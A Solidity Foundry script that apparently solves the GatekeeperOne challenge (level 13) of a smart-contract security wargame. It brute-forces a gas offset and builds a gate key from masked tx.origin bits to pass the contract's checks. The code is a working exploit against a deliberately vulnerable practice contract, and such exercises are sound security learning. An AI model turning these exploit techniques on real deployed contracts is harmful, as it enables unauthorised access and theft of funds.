// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "../instance/Level13.sol";

contract ExploitLevel13 is Script {
    GatekeeperOne instance = GatekeeperOne(0x7CF153d2D53843c52A81d7366491dc1bdB2a118e);
    AttackGatekeeperOne attackG1;

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        attackG1 = new AttackGatekeeperOne(instance);

        uint256 i = attackG1.attackSim();

        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        attackG1.attackReal(i);
    }
}

contract AttackGatekeeperOne {
    GatekeeperOne instance;

    constructor(GatekeeperOne _instance) {
        instance = _instance;
    }

    function attackSim() external returns (uint256 i) {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (i = 0; i < 8192; i++) {
            (bool success,) =
                address(instance).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                console.log("i:", i);
                break;
            }
        }
    }

    function attackReal(uint256 i) external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        bool result = instance.enter{gas: i + (8191 * 3)}(_gateKey);
        console.log("Entered?", result);
    }
}
